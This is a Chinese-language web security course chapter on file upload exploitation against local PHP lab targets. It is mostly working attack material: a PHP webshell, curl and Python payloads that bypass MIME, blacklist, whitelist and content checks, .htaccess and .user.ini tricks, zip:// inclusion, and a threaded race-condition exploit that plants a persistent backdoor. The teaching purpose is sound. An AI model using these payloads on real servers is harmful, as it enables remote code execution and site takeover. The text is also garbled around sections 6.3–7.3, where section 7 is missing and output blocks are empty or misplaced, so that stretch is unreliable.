# W07 文件上传
## File Upload Exploitation

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W02-工具链实战与靶场搭建|W02]] · [[W03-信息泄露与前端安全|W03]]
> **本章目标**：把"能传上去、知道路径、能被解析执行"三要素落到自建靶上逐环打穿：客户端校验、MIME、后缀黑名单、白名单与解析环节、内容检测五类防御逐类给绕过与结论；理清 php -S、Apache、Nginx+php-fpm 三类服务器的解析差异，并收录几个只在旧环境成立的历史解析漏洞；掌握条件竞争的窗口原理与并发打法；最后组合出让本章全部绕过失效的防御配置。

[[11-Web安全版图与Burp#3.5 文件上传：传上去的就是 shell|11 章 3.5]]给过这类漏洞的三要素——**能传上去 + 知道路径 + 能被解析执行**——和一张绕过思路速查表。那一节回答的是"这类漏洞长什么样"；本章把速查表的每一类放到自建靶上逐条打穿，每条绕过配命令与输出。与 [[W06-文件包含|W06]] 的分工：图片马、zip 条目这类"上传侧送进去、包含侧执行"的组合拳，包含机制归 W06 讲，本章只负责把文件送到位。

和 [[W04-SQL注入|W04]]、[[W05-命令注入与代码执行|W05]] 的方法相同：自建靶、curl 手工打、每条 payload 配输出。端口用 8700 段。

> [!note] 本章的实验约定
> 靶机全部用 [[W02-工具链实战与靶场搭建|W02]] 的 `php -S` 起服务，PHP 行为以 8.5 为准；涉及 Apache、Nginx+php-fpm、IIS、Windows 的行为，正文单独写清对应的服务器与版本，不配输出。curl 一律带 `--noproxy '*'`（防止系统代理往响应里塞内容，[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），URL 一律用引号包住。上传文件用 curl 的 `-F` 选项，它按浏览器上传的同一格式（multipart/form-data，报文结构见 [[W01-Web安全导论与HTTP深化|W01]]）组包。

## 1. 三要素：能传上去、知道路径、能被解析

| 要素 | 服务端必须同时满足的 | 本章对应 |
| ---- | ---- | ---- |
| 能传上去 | 各类校验（后缀、类型、内容）放行了这份文件 | 第 3–7 节逐类绕 |
| 知道路径 | 保存路径可推知（回显、命名规律、目录爆破） | 本节的路径线索；第 10 节的随机名防御 |
| 能被解析执行 | 保存位置落在"会被当代码执行"的解析范围内 | 2.3、5.3、6 节；第 10 节的站外存储防御 |

基线靶 up_basic.php 没有任何校验，三要素天然齐备，先看漏洞长什么样：

```php
<?php
// up_basic.php —— 基线靶：无任何校验，收下、按原名存进 uploads/、回显路径
if (!isset($_FILES['f'])) {
    exit("no file\n");
}
$dst = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "saved: {$dst}\n";
```

建目录、放一个贯穿全章的测试脚本、起靶：

```bash
mkdir -p ~/labs/w07/uploads
cd ~/labs/w07
printf '<?php system($_GET["c"] ?? "id");\n' > shell.php
PHP_CLI_SERVER_WORKERS=8 php -S 127.0.0.1:8700 -d display_errors=1
```

`PHP_CLI_SERVER_WORKERS=8` 让 php -S 以 8 个 worker 进程运行：php -S 默认单进程、同一时刻只处理一个请求（[[W02-工具链实战与靶场搭建|W02]] 2.2），第 8 节的条件竞争需要"上传请求与访问请求同时被处理"，多 worker 从头开好，对前面各节没有影响。`-d display_errors=1` 让报错直接进 HTTP 响应，学习期能看到每个 payload 的失败原因。

`-F` 的三个常用形态，本章全程在用：

| curl -F 写法 | 发出的内容 |
| ---- | ---- |
| `-F 'f=@shell.php'` | 文件字段 f，文件名 shell.php，Content-Type 由 curl 按后缀猜 |
| `-F 'f=@本地路径;filename=shell.png'` | 存盘用的名字改为 filename= 的值 |
| `-F 'f=@shell.php;type=image/png'` | 该字段自报的 Content-Type 改为 image/png |

**第一要素：能传上去。**

```bash
curl -s --noproxy '*' -F 'f=@shell.php' 'http://127.0.0.1:8700/up_basic.php'
```

输出：

```
saved: uploads/shell.php
```

**第二要素：知道路径。** 靶子把保存路径原样回显了（真实站点少有这么直白，路径藏起来时的找法见第 11 节常见问题表）。php -S 的 URL 映射规则是"文档根下的相对路径"：`uploads/shell.php` 对应 `/uploads/shell.php`。

**第三要素：能被解析执行。** 请求它，`c` 参数的命令被执行：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/shell.php?c=id'
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/shell.php?c=pwd'
```

输出：

```
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
/home/hua/labs/w07/uploads
```

`pwd` 顺带暴露了执行环境的一个事实：==php -S 把工作目录切到被执行脚本所在的目录==，这个 webshell 的 `pwd` 落在 `uploads/` 里——它执行命令时的相对路径（`ls`、`cat xxx`）都以自己所在目录为基准。

> [!warning] 三缺一都白搭
> 缺"能传"：文件根本不在服务器上。缺"知道路径"：文件在但摸不到，等于没有。缺"能被解析"：文件访问得到，但只是一份可下载的字节。出题人的每层防御都对应砍掉一环——第 5 节砍第一环，第 10 节的随机重命名砍第二环、站外存储砍第三环。打靶卡住时，先判断卡在哪一环，再换对应层的打法。

## 2. 自建靶：基线与四个校验变体

### 2.1 目录与代码

靶场沿用 [[W02-工具链实战与靶场搭建|W02]] 第 2 节的自建方式：一个目录、若干 PHP 文件、一条启动命令。文件与分工：

```
lab/
├── up_basic.php      ← 基线靶：无任何校验（1 节用）
├── up_client.html    ← 前端校验靶：后缀检查在 JS 里（3 节用）
├── up_client.php     ← 前端靶的后端：服务端无校验
├── t_mime.php        ← MIME 靶：只信自报的 Content-Type（4 节用）
├── t_black.php       ← 黑名单靶：名单外全放行（5 节用）
├── t_white.php       ← 白名单靶：只放行图片后缀（6 节用）
├── t_zip.php         ← 白名单变体：放行压缩包（6.3 用）
├── t_content.php     ← 内容检测靶：白名单 + getimagesize（7 节用）
├── inc.php           ← 包含辅助靶：给上传产物提供执行点（6.3、7 节用）
├── t_race.php        ← 条件竞争靶（8 节用）
├── t_safe.php        ← 防御靶（10 节用）
├── race_shell.php    ← 竞态弹体（8 节用）
└── uploads/          ← 上传目录
```

前端校验靶。检查规则全在发给浏览器的页面里：

```html
<!doctype html>
<!-- up_client.html —— 前端校验靶：后缀检查只存在于这段发给浏览器的 JS 里 -->
<meta charset="utf-8">
<form action="up_client.php" method="post" enctype="multipart/form-data">
  <input type="file" name="f"><br>
  <button type="submit">upload</button>
</form>
<script>
document.forms[0].addEventListener('submit', function (e) {
  var v = document.querySelector('input[type=file]').value;
  if (!/\.(png|jpg|jpeg|gif)$/i.test(v)) {
    alert('only images');
    e.preventDefault();              // 阻止提交，请求根本不会发出
  }
});
</script>
```

它的后端没有任何校验，与 up_basic.php 同构：

```php
<?php
// up_client.php —— 前端校验靶的后端：没有任何服务端校验，收到什么存什么
if (!isset($_FILES['f'])) {
    exit("no file\n");
}
$dst = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "saved: {$dst}\n";
```

MIME 靶。校验的原料是 `$_FILES['f']['type']`：

```php
<?php
// t_mime.php —— MIME 靶：只信请求自报的 Content-Type（$_FILES['f']['type']）
if (($_FILES['f']['type'] ?? '') !== 'image/png') {
    exit("reject: Content-Type = " . ($_FILES['f']['type'] ?? '(none)') . "\n");
}
$dst = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "saved: {$dst}\n";
```

黑名单靶。名单只禁 `php`，且故意保留一个缺陷：比较前没做大小写归一：

```php
<?php
// t_black.php —— 黑名单靶：后缀在名单里就拒绝，名单外的全放行（未做大小写归一）
$black = ['php'];
$ext = pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION);
if (in_array($ext, $black, true)) {
    exit("reject: .{$ext}\n");
}
$dst = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "saved: {$dst}\n";
```

白名单靶。只有名单里的后缀放行：

```php
<?php
// t_white.php —— 白名单靶：只有名单里的后缀放行
$allow = ['png', 'jpg', 'jpeg', 'gif'];
$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allow, true)) {
    exit("reject: .{$ext}\n");
}
$dst = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "saved: {$dst}\n";
```

白名单变体：图片之外再放行压缩包（附件站常见配置）：

```php
<?php
// t_zip.php —— 白名单变体：图片之外再放行压缩包（附件站常见配置）
$allow = ['png', 'jpg', 'jpeg', 'gif', 'zip'];
$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allow, true)) {
    exit("reject: .{$ext}\n");
}
$dst = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "saved: {$dst}\n";
```

内容检测靶。白名单锁后缀之外，再用 `getimagesize()` 认文件头：

```php
<?php
// t_content.php —— 内容检测靶：白名单锁后缀 + getimagesize 认文件头
$allow = ['png', 'jpg', 'jpeg', 'gif'];
$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allow, true)) {
    exit("reject: .{$ext}\n");
}
$info = @getimagesize($_FILES['f']['tmp_name']);
if ($info === false) {
    exit("reject: not an image\n");
}
$dst = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $dst) or exit("move failed\n");
echo "saved: {$dst}  ({$info['mime']})\n";
```

包含辅助靶。包含机制是 [[W06-文件包含|W06]] 的主题，这里只当一个"执行点"用：

```php
<?php
// inc.php —— 文件包含辅助靶：包含机制归 W06 讲，这里只当"执行点"用
include($_GET['file'] ?? '');
```

### 2.2 正常上传的样子

四个变体靶各自拦什么，先用一张正常的图片走一遍。`printf` 造的是一个只有 22 字节的最小合法 GIF（1×1 像素）：

```bash
printf 'GIF89a\x01\x00\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;' > tiny.gif
curl -s --noproxy '*' -F 'f=@tiny.gif' 'http://127.0.0.1:8700/t_white.php'
```

输出：

```
saved: uploads/tiny.gif
```

白名单放行正常图片，服务照常。接下来逐个变体打它的攻击面。

### 2.3 php -S 只执行 .php 后缀

把同一份 PHP 代码换个名字再传，看执行环节发生什么：

```bash
curl -s --noproxy '*' -F 'f=@shell.php;filename=imgshell.png' 'http://127.0.0.1:8700/up_basic.php'
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/imgshell.png?c=id'
```

输出：

```
saved: uploads/imgshell.png
<?php system($_GET["c"] ?? "id");
```

文件存进去了、URL 也访问到了，但回来的是源码本身——php -S 没有执行它。补上响应头看服务器把它当成了什么：

```bash
curl -s -i --noproxy '*' 'http://127.0.0.1:8700/uploads/imgshell.png' | head -6
```

输出：

```
HTTP/1.1 200 OK
Host: 127.0.0.1:8700
Date: Fri, 23 Oct 2026 13:48:34 GMT
Connection: close
Content-Type: image/png
Content-Length: 34
```

php -S 只把以 `.php` 结尾的请求当 PHP 执行（大小写不敏感，[[#5.1 名单外的等价名字|5.1]] 有对照输出），其余一律按静态文件原样返回——连 `Content-Type: image/png` 都是按后缀猜的，==PHP 源码被当成一张图片吐了回去==。

> [!note] 对本章教学靶的影响
> php -S 的这条解析规则意味着：所有"改名"类上传（.php5、.png、图片马）在 php -S 靶上都传得上去、执行不了。它们的执行验证在本章走两条路：站点有包含点的，用 inc.php 顶替解析环节（6.3、7 节）；解析环节本身的差异，按 5.3 节的服务器分表判断。==上传侧的结论（存进去没有）与执行侧的结论（解析没有）要分开记==。

## 3. 客户端校验：检查只存在于浏览器里

up_client.html 的后缀检查是页面上的一段 JS，执行地点是浏览器（[[W03-信息泄露与前端安全#6. 前端校验绕过|W03 6]] 的结论：==前端校验是体验，不是安全==）。确认一下检查确实只活在这个页面里：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8700/up_client.html' | sed -n '/<script>/,/<\/script>/p'
```

输出：

```
<script>
document.forms[0].addEventListener('submit', function (e) {
  var v = document.querySelector('input[type=file]').value;
  if (!/\.(png|jpg|jpeg|gif)$/i.test(v)) {
    alert('only images');
    e.preventDefault();              // 阻止提交，请求根本不会发出
  }
});
</script>
```

这段正则拦的是"浏览器里的提交动作"。绕开它不需要任何技巧：不用浏览器发请求就行了。curl 直接打后端，后端没有任何校验：

```bash
curl -s --noproxy '*' -F 'f=@shell.php' 'http://127.0.0.1:8700/up_client.php'
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/shell.php?c=whoami'
```

输出：

```
saved: uploads/shell.php
hua
```

服务端视角里，JS 校验过的请求和手工构造的请求没有区别——==校验代码没有被"绕过"，它只是从头到尾没被加载==。真实站点上用 Burp Repeater 改包重放是同一件事（[[11-Web安全版图与Burp#2.1 Burp Suite：中间人本尊|11 章 2.1]]）；在浏览器里禁 JS、控制台改 DOM 也可以，[[W03-信息泄露与前端安全#6. 前端校验绕过|W03 6.3]] 演示过。

## 4. MIME 检查：请求自报的类型

multipart 报文里每个文件部分自带一个 `Content-Type` 头，PHP 把它原样抄进 `$_FILES['f']['type']`。t_mime.php 只信这个值——而它是客户端填的。curl 对 `-F` 的默认行为是按本地文件后缀猜类型，`.php` 不在其内置表里，给 `application/octet-stream`：

```bash
curl -s --noproxy '*' -F 'f=@shell.php' 'http://127.0.0.1:8700/t_mime.php'
```

输出：

```
reject: Content-Type = application/octet-stream
```

对照一张正常图片，curl 按后缀猜出 `image/png`，靶子放行：

```bash
printf 'x' > fake.png
curl -s --noproxy '*' -F 'f=@fake.png' 'http://127.0.0.1:8700/t_mime.php'
```

输出：

```
saved: uploads/fake.png
```

把类型显式指定成靶子想看的值，PHP 代码同样过检：

```bash
curl -s --noproxy '*' -F 'f=@shell.php;type=image/png' 'http://127.0.0.1:8700/t_mime.php'
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/shell.php?c=whoami'
```

输出：

```
saved: uploads/shell.php
hua
```

==Content-Type 是请求的一部分：谁构造请求，谁决定它的值==。服务端拿它做校验，等于拿攻击者的自述当证据。要看内容，得用第 7 节的 `getimagesize()` 这类读文件本的检查；在真实站点上，这一节的改写就是 Burp 里改报文的一行字。

## 5. 后缀黑名单：名单与等价名字

### 5.1 名单外的等价名字

t_black.php 的名单只有 `php`，且比较前没有归一化大小写。把一批候选名字挨个打过去：

```bash
for n in shell.php shell.PHP shell.pHp shell.php5 shell.pht shell.phar shell.phtml; do
  printf '%-14s -> ' "$n"
  curl -s --noproxy '*' -F "f=@shell.php;filename=$n" 'http://127.0.0.1:8700/t_black.php'
done
```

输出：

```
shell.php      -> reject: .php
shell.PHP      -> saved: uploads/shell.PHP
shell.pHp      -> saved: uploads/shell.pHp
shell.php5     -> saved: uploads/shell.php5
shell.pht      -> saved: uploads/shell.pht
shell.phar     -> saved: uploads/shell.phar
shell.phtml    -> saved: uploads/shell.phtml
```

名单精确匹配 `.php`，名单外的名字全部过检。逐个请求，看 php -S 对每个名字给的是执行还是源码：

```bash
for n in shell.php shell.PHP shell.pHp shell.php5 shell.phtml; do
  echo "--- GET /uploads/$n"
  curl -s --noproxy '*' "http://127.0.0.1:8700/uploads/$n?c=id"
done
```

输出：

```
--- GET /uploads/shell.php
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
--- GET /uploads/shell.PHP
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
--- GET /uploads/shell.pHp
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
--- GET /uploads/shell.php5
<?php system($_GET["c"] ?? "id");
--- GET /uploads/shell.phtml
<?php system($_GET["c"] ?? "id");
```

两层结论分开看：

- **上传侧**：`.PHP`、`.pHp`、`.php5`、`.pht`、`.phar`、`.phtml` 都能过这份黑名单；
- **执行侧（php -S）**：`.PHP` 与 `.pHp` 被执行——php -S 的后缀匹配不区分大小写，==大小写绕过在这类靶上一步到 shell==；`.php5` 一族全部只回源码。

本靶没做 `strtolower` 才让大小写直通；真实代码十有八九会加。加了之后大小写这条路断掉，但名单外的等价后缀与 5.2 的尾部点、空格不受影响——它们靠的不是大小写，是"后缀的取值本身就变了"。

### 5.2 尾部点、尾部空格与 ::$DATA

`pathinfo()` 怎么取这两个名字的后缀，先看准确行为：

```bash
php -r 'var_dump(pathinfo("shell.php.", PATHINFO_EXTENSION));'
php -r 'var_dump(pathinfo("shell.php ", PATHINFO_EXTENSION));'
```

输出：

```
string(0) ""
string(4) "php "
```

尾部点让后缀变成空串，尾部空格让后缀变成带空格的 `"php "`——都不等于名单里的 `"php"`，黑名单失效。尾部点直接传：

```bash
curl -s --noproxy '*' -F 'f=@shell.php;filename=shell.php.' 'http://127.0.0.1:8700/t_black.php'
```

输出：

```
saved: uploads/shell.php.
```

尾部空格用同样的 curl 写法会失败：

```bash
curl -s --noproxy '*' -F 'f=@shell.php;filename=shell.php ' 'http://127.0.0.1:8700/t_black.php'
```

输出：

```
reject: .php
```

服务器看到的后缀是 `php`——尾部空格根本没送达。这不是服务端挡住了攻击：==curl 的 -F 解析会把参数尾部的空白剪掉==。要发带尾部空格的文件名，改用 requests（真实场景里也可以用 Burp 手改 multipart）：

```python
# upspace.py —— curl 会剪掉 -F 参数尾部的空白，带尾部空格的文件名改用 requests 发
import requests

r = requests.post('http://127.0.0.1:8700/t_black.php',
                  files={'f': ('shell.php ', open('shell.php', 'rb').read())})
print(r.text)
```

```bash
python3 upspace.py
ls uploads/ | cat -A | grep 'php '
```

输出：

```
saved: uploads/shell.php 

shell.php $
```

`cat -A` 的 `$` 是行尾标记：`shell.php $` 说明文件名以空格结尾、真实落盘。请求这两个文件，URL 里的空格写成 `%20`：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/shell.php.?c=id'
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/shell.php%20?c=id'
```

输出：

```
<?php system($_GET["c"] ?? "id");
<?php system($_GET["c"] ?? "id");
```

两个名字都不再"以 .php 结尾"，php -S 一律按静态文件返回源码。它们的价值在 Windows 平台才兑现：

> [!info]- Windows 侧的折叠与 ::$DATA
> 两条 NTFS/Win32 机制，Linux 文件系统按字面保存文件名，所以本章靶上只能看到"原样保存"。原理与适用平台：
>
> - **尾部点与尾部空格折叠**：Win32 的文件 API 创建文件时把名字尾部的点与空格剥掉——`move_uploaded_file(..., "shell.php.")` 在 Windows 上落盘成 `shell.php`。后缀校验时 `pathinfo` 看到的是 `.php.`（放行），落盘后服务器看到的就是一个标准 `.php`。适用：Windows 上的 Apache / IIS / 任何 PHP 部署。
> - **NTFS 交替数据流（ADS）**：NTFS 允许文件名带流名，`shell.php::$DATA` 指 shell.php 的默认数据流；按这个名字 `move_uploaded_file`，NTFS 里出现的是 `shell.php`（内容在默认流里），服务器按 `shell.php` 解析。适用：Windows + NTFS。
>
> 打 Linux 靶时这两条写法只会得到一个名字怪异的静态文件，见到 Windows 指纹再用。

### 5.3 谁会执行这些名字：三类服务器

执行环节由服务器配置决定。把本章测过的 php -S 结论与 Apache、Nginx+php-fpm 的机制汇总成一张表：

| 名字 | php -S（本章靶） | Nginx + php-fpm（典型配置） | Apache + mod_php |
| ---- | ---- | ---- | ---- |
| `shell.php` | 执行 | 执行（`location ~ \.php$` 转给 fpm） | 执行 |
| `shell.PHP` / `.pHp` | 执行（匹配不区分大小写） | 不执行（`location ~` 正则区分大小写，按静态文件处理） | 随配置：老式 `AddHandler` 按扩展名表分发，大小写不敏感，执行；Debian/Ubuntu 现行配置用 `<FilesMatch ".+\.ph(ar\|p\|tml)$">` 正则匹配完整文件名，区分大小写，不执行 |
| `.php5` / `.pht` | 不执行，静态返回源码 | 不执行 | 老式 `AddHandler` 名单（常见 `.php .php3 .php4 .php5 .phtml .pht`）内执行；现行 Debian/Ubuntu 的 FilesMatch 不覆盖这两个，不执行 |
| `.phtml` / `.phar` | 不执行，静态返回源码 | 不执行 | 现行 Debian/Ubuntu 的 FilesMatch 覆盖 `.phtml` 与 `.phar`，执行 |
| 尾部点 / 尾部空格 | 不执行，静态返回源码 | 不执行 | Linux：不执行；Windows：文件系统折叠后按 `shell.php` 执行 |
| `::$DATA` | 原样保存，不适用 | 原样保存，不适用 | Windows + NTFS：存为 ADS，按 `shell.php` 执行 |

> [!warning] 教学靶的执行结论不能迁移
> 本章所有"执行/不执行"的输出都出自 php -S。换到 Apache 或 Nginx+php-fpm，同一批文件名的结论会变。打真实靶的次序：先看指纹（Server / X-Powered-By，[[11-Web安全版图与Burp#5. 打题流程：拿到题先看什么|11 章 5]] 第 1 步），再按这张表判断解析环节，最后才决定上传什么名字。

## 6. 白名单与解析环节

### 6.1 白名单靶：传得上、解析不了

白名单把 PHP 拦在门外，同时把图片放进来：

```bash
curl -s --noproxy '*' -F 'f=@shell.php' 'http://127.0.0.1:8700/t_white.php'
curl -s --noproxy '*' -F 'f=@shell.php;filename=shell.png' 'http://127.0.0.1:8700/t_white.php'
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/shell.png?c=id'
```

输出：

```
reject: .php
saved: uploads/shell.png
<?php system($_GET["c"] ?? "id");
```

PHP 代码以 `.png` 之名完整落盘，php -S 按静态文件返回源码——2.3 节的规则在白名单下同样成立。==白名单锁死了"存进来的名字"，锁不住"服务器怎么解析"==。让"图片"被执行的两条经典路子都在解析环节做文章：

### 6.2 .htaccess 与 .user.ini：让"图片"被执行

**.htaccess（Apache 专用）**。Apache 的目录级配置文件：主配置对该目录开启 `AllowOverride All` 时，Apache 每个请求都会读取并应用它。往上传目录放一份：

```apache
# .htaccess —— 让 .png 交给 PHP 处理器
AddType application/x-httpd-php .png
```

此后该目录下所有 `.png` 都按 PHP 执行，6.1 落盘的 `shell.png` 立刻变成 shell。适用条件：Apache + mod_php（或配套的 `SetHandler` 转发配置），且 `AllowOverride All`。php -S 与 Nginx 都不读这个文件。

**.user.ini（CGI/FastCGI 专用）**。PHP 在 CGI/FastCGI 模式（php-fpm 是当代主流）下的目录级 ini：每个请求按目录读取（结果缓存 `user_ini.cache_ttl` 秒，默认 300），`auto_prepend_file` 让该目录下每个被执行的 PHP 脚本先执行指定文件：

```ini
; .user.ini —— 该目录下每个 PHP 请求先执行 shell.png
auto_prepend_file=shell.png
```

适用条件：CGI/FastCGI 部署；mod_php 与 php -S 不读它。php -S 的这个行为可以对照出来——把 `.user.ini` 放进一个目录，看目录里的 PHP 会不会先执行 prepend 目标。up_basic.php 在没有文件字段时会输出 `no file`，拿它当信号：

```bash
mkdir -p initest
printf '<?php echo "[x.php ran]\\n";' > initest/x.php
printf 'auto_prepend_file="/home/hua/labs/w07/up_basic.php"\n' > initest/.user.ini
curl -s --noproxy '*' 'http://127.0.0.1:8700/initest/x.php'
```

输出：

```
[x.php ran]
```

如果 `.user.ini` 生效，up_basic.php 会先执行并让输出以 `no file` 开头；实际只有 x.php 自己的一行——==php -S 不读 .user.ini==。这两条路的成立前提还有一条：这两个配置文件本身得先传上去。看白名单靶的态度：

```bash
printf 'AddType application/x-httpd-php .png\n' > htaccess.tpl
printf 'auto_prepend_file=shell.png\n' > userini.tpl
curl -s --noproxy '*' -F 'f=@htaccess.tpl;filename=.htaccess' 'http://127.0.0.1:8700/t_white.php'
curl -s --noproxy '*' -F 'f=@userini.tpl;filename=.user.ini' 'http://127.0.0.1:8700/t_white.php'
```

输出：

```
reject: .htaccess
reject: .ini
```

白名单连配置文件一起拦掉。这两条路成立的真实场景是**黑名单站**：名单只禁 `php` 一族，`.htaccess`、`.user.ini` 不在名单里，上传它们毫无阻力。上传侧还有第三条组合路，它在白名单靶上就能走通：

### 6.3 上传侧加包含侧：zip 条目绕过后缀

t_zip.php 的名单放行压缩包。把 PHP 代码压进 zip，条目名就叫 `shell.php`：

```bash
zip -q evil.zip shell.php
unzip -l evil.zip | tail -4
curl -s --noproxy '*' -F 'f=@evil.zip' 'http://127.0.0.1:8700/t_zip.php'
```

输出：

```
---------  ---------- -----   ----
       34  2026-10-23 21:48   shell.php
---------                     -------
       34                     1 file
saved: uploads/evil.zip
```

白名单看到的后缀是 `zip`，放行；包内的 `shell.php` 不经过任何检查。zip 包是合法文件，任何服务器都不会执行 `.zip`——执行靠包含点，[[W06-文件包含#4.7 zip:// 与 phar://：包内条目也是文件|W06 4.7]] 的 `zip://` 协议精确指向包内条目：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8700/inc.php?file=zip:///home/hua/labs/w07/uploads/evil.zip%23shell.php&c=id'
```

输出：

```

```

整条链里三要素的分工：能传（zip 过白名单）、知道路径（响应回显）、能解析（包含点顶替了解析环节）。==白名单检查的是"文件名结尾"，包内条目名不经过它==；而没有包含点的站点，这条链到"落盘"为止——它是上传与包含的组合拳，不是上传单独 getshell。

### 7.3 从图片马到执行

```

GIF89auid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
```

第一条输出是图片原样（静态文件）；第二条经 inc.php 包含，`<?php` 标签内的代码被执行，标签外的 `GIF89a` 原样输出在结果前面（"标签外原样输出"这条执行机制是 [[W06-文件包含#1.2 "<?php 之外原样输出"：包含为什么等于执行|W06 1.2]] 的主题）。==上传侧负责把内容以图片的名义送进去，执行靠包含点==；没有包含点时，还有 6.2 的 `.htaccess`/`.user.ini` 与第 9 节的 Nginx 畸形解析两扇门，各自吃特定的服务器配置。

> [!info]- 图片马的变体与二次渲染
> - **PNG/JPG 头**：PNG 签名 8 字节 + IHDR 结构（含 CRC），手工构造比 GIF 麻烦；最省事的做法是拿一张真 PNG/JPG 在尾部追加 `<?php … ?>`——头部完全合法，追加字节不影响格式识别，包含时同样执行。GIF 同理：`GIF89a` 前缀，或真图 + 追加。
> - **exif_imagetype 与 finfo**：exif_imagetype 只认图片魔数，比 getimagesize 更省；finfo（fileinfo 扩展）按 magic 数据库判 MIME，同样只读头部——都挡不住"头部合法 + 尾部带码"。
> - **二次渲染**：站点用 GD（imagepng / imagejpeg）把上传图重采样另存时，非图像数据被重写抹掉，图片马直接死。绕法是把代码塞进重采样不改写的结构里（GIF 的注释扩展、PNG 的特定数据块），属于开了二次渲染之后的进阶对抗；先记住"二次渲染会抹码"这个排查方向。
> - **检查点选择**：内容检测防的是"假图片"，执行控制要靠解析环节（存储目录不给执行、白名单 + 随机名）——与第 10 节的防御组合对照。

## 8. 条件竞争：先保存再删除的窗口

有的站点校验放在落盘**之后**：先把文件按原名保存，再检查后缀，不合格就 `unlink` 删除。t_race.php 就是这个顺序：

```php
<?php
// t_race.php —— 条件竞争靶：先保存 → 再检查 → 不合格就删除
$name = 'uploads/' . $_FILES['f']['name'];
move_uploaded_file($_FILES['f']['tmp_name'], $name) or exit("move failed\n");
$ext = strtolower(pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION));
if ($ext !== 'png') {
    unlink($name);
    exit("uploaded, checked, deleted\n");
}
echo "saved: {$name}\n";
```

`move_uploaded_file` 与 `unlink` 之间的那段时间里，==不合格的文件是一个真实存在于 `uploads/` 的 `.php` 文件==——php -S 会照常执行它。这个窗口以微秒计，单发请求撞不上；把"上传"与"访问"两个动作并发起来反复打，总有一次访问落在窗口里。先看靶子的正常行为，单发一次、确认文件被删：

```bash
rm -f uploads/shell.php uploads/pwned.php
curl -s --noproxy '*' -F 'f=@race_shell.php;filename=shell.php' 'http://127.0.0.1:8700/t_race.php'
ls uploads/shell.php
```

输出：

```
uploaded, checked, deleted
ls: cannot access 'uploads/shell.php': No such file or directory
```

竞态弹体 race_shell.php，执行命令之外多干一件事——落地一个持久的 pwned.php：

```php
<?php
// race_shell.php —— 竞态弹体：命中窗口即执行，同时落地一个持久的 pwned.php
system($_GET['c'] ?? 'id');
file_put_contents(__DIR__ . '/pwned.php', '<?php system($_GET["c"]); ?>');
```

并发脚本：4 个上传线程不停传 `shell.php`，4 个访问线程不停请求它，谁读到执行结果谁收工：

```python
# race.py —— 条件竞争：上传线程不停传 shell.php，访问线程不停请求它，
#            抢 t_race.php "保存 → 检查 → 删除"之间的窗口
# 服务端需多 worker 启动：PHP_CLI_SERVER_WORKERS=8 php -S 127.0.0.1:8700
import threading

import requests

BASE = 'http://127.0.0.1:8700'
PAYLOAD = open('race_shell.php', 'rb').read()
stop = threading.Event()

def uploader():
    s = requests.Session()
    s.trust_env = False                  # 不走系统代理，等价 curl 的 --noproxy '*'
    while not stop.is_set():
        try:
            s.post(BASE + '/t_race.php',
                   files={'f': ('shell.php', PAYLOAD)},
                   timeout=5)
        except requests.RequestException:
            pass

def visitor():
    s = requests.Session()
    s.trust_env = False
    while not stop.is_set():
        try:
            r = s.get(BASE + '/uploads/shell.php', params={'c': 'id'}, timeout=5)
        except requests.RequestException:
            continue
        if 'uid=' in r.text:
            print('== race hit ==')
            print(r.text.strip())
            stop.set()
            return

threads = [threading.Thread(target=uploader) for _ in range(4)]
threads += [threading.Thread(target=visitor) for _ in range(4)]
for t in threads:
    t.start()
for t in threads:
    t.join(timeout=30)
stop.set()
print('done')
```

```bash
python3 race.py
```

输出：

```
== race hit ==
uid=1000(hua) gid=1000(hua) groups=1000(hua),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),1001(docker)
done
```

命中后收尾三件事：弹体已被删除（窗口确实关闭了）、pwned.php 留了下来、它还能执行：

```bash
ls uploads/shell.php
curl -s --noproxy '*' 'http://127.0.0.1:8700/uploads/pwned.php?c=id'
```

输出：

```
